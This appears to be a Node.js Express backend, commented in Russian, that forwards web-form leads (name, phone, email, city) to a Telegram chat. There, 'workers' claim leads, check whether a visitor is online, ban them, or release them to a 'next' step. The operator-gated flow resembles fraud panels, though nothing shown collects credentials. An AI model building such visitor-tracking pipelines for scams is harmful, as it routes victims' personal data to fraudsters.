const express = require("express");
const TelegramBot = require("node-telegram-bot-api");

const app = express();

app.use(express.json({ limit: "1mb" }));
app.use((req, res, next) => {
  res.header("Access-Control-Allow-Origin", "*");
  res.header("Access-Control-Allow-Headers", "Content-Type");
  next();
});

// ===== БОТЫ =====

// ✅ ТОЛЬКО ОДИН polling
const workerBot = new TelegramBot(process.env.WORKER_BOT_TOKEN, {
  polling: true
});

// ❌ БЕЗ polling (важно!)
const enterBot = new TelegramBot(process.env.ENTER_BOT_TOKEN);

// ===== ENV =====
const adminId = Number(process.env.ADMIN_CHAT_ID);
const workerChat = Number(process.env.WORKER_CHAT_ID);

// ===== БАЗЫ =====
let takenRequests = {};
let fullRequests = {};
let shortRequests = {};
let seenUsers = {};
let onlineUsers = {};
let bannedUsers = {};
let userStatus = {};

// ===== ONLINE =====
function isOnline(id) {
  if (!onlineUsers[id]) return false;
  return Date.now() - onlineUsers[id] < 20000;
}

// ===== ВХОД =====
app.post("/enter", (req, res) => {
  const id = req.body.clientId;
  if (!id) return res.json({ ok: false });

  onlineUsers[id] = Date.now();

  enterBot.sendMessage(adminId, `👀 Вход\n🆔 ${id}`).catch(()=>{});

  res.json({ ok: true });
});

// ===== ПИНГ =====
app.post("/ping", (req, res) => {
  const id = req.body.clientId;
  if (id) onlineUsers[id] = Date.now();
  res.json({ ok: true });
});

// ===== ЗАЯВКА =====
app.post("/send", (req, res) => {
  const d = req.body;
  const id = d.clientId;

  if (!id) return res.json({ ok: false });
  if (bannedUsers[id]) return res.json({ ok: false });

  const isRepeat = seenUsers[id];
  seenUsers[id] = true;

  const statusText = isRepeat ? "🔁 ПОВТОРНАЯ ЗАЯВКА" : "🆕 НОВАЯ ЗАЯВКА";

  const fullText = `${statusText}

🆔 ID: ${id}

📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}
📧 ${d.email}
🏙 ${d.city}
💬 ${d.comment}`;

  const shortText = `📦 ${d.service}
👤 ${d.name}
📞 ${d.phone}`;

  fullRequests[id] = fullText;
  shortRequests[id] = shortText;

  workerBot.sendMessage(workerChat, shortText, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "📥 Забрать", callback_data: "take_" + id }]
      ]
    }
  });

  res.json({ ok: true });
});

// ===== CALLBACK =====
workerBot.on("callback_query", async (q) => {
  const data = q.data;
  const id = data.split("_")[1];

  if (data.startsWith("take")) {

    if (takenRequests[id]) {
      return workerBot.answerCallbackQuery(q.id, {
        text: "❌ Уже занято"
      });
    }

    const user = q.from.username
      ? "@" + q.from.username
      : q.from.first_name;

    takenRequests[id] = q.from.id;

    workerBot.sendMessage(q.from.id, fullRequests[id], {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🟢 Онлайн?", callback_data: "check_" + id }],
          [
            { text: "🚫 Бан", callback_data: "ban_" + id },
            { text: "✅ Разбан", callback_data: "unban_" + id }
          ],
          [{ text: "➡️ ДАЛЬШЕ", callback_data: "allow_" + id }]
        ]
      }
    }).catch(() => {
      workerBot.answerCallbackQuery(q.id, {
        text: "❌ Напиши боту /start"
      });
    });

    const newText = `${shortRequests[id]}

👤 Взял: ${user}`;

    try {
      await workerBot.editMessageText(newText, {
        chat_id: q.message.chat.id,
        message_id: q.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "🔓 Освободить", callback_data: "free_" + id }]
          ]
        }
      });
    } catch {}

    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("free")) {

    if (takenRequests[id] !== q.from.id) {
      return workerBot.answerCallbackQuery(q.id, {
        text: "❌ Не твоя"
      });
    }

    delete takenRequests[id];

    try {
      await workerBot.editMessageText(shortRequests[id], {
        chat_id: q.message.chat.id,
        message_id: q.message.message_id,
        reply_markup: {
          inline_keyboard: [
            [{ text: "📥 Забрать", callback_data: "take_" + id }]
          ]
        }
      });
    } catch {}

    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("check")) {
    workerBot.answerCallbackQuery(q.id, {
      text: isOnline(id) ? "🟢 Онлайн" : "🔴 Оффлайн"
    });
  }

  if (data.startsWith("ban")) {
    bannedUsers[id] = true;
    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("unban")) {
    delete bannedUsers[id];
    workerBot.answerCallbackQuery(q.id);
  }

  if (data.startsWith("allow")) {
    userStatus[id] = "next";
    workerBot.answerCallbackQuery(q.id);
  }
});

app.listen(process.env.PORT || 3000, () => {
  console.log("SERVER OK");
});
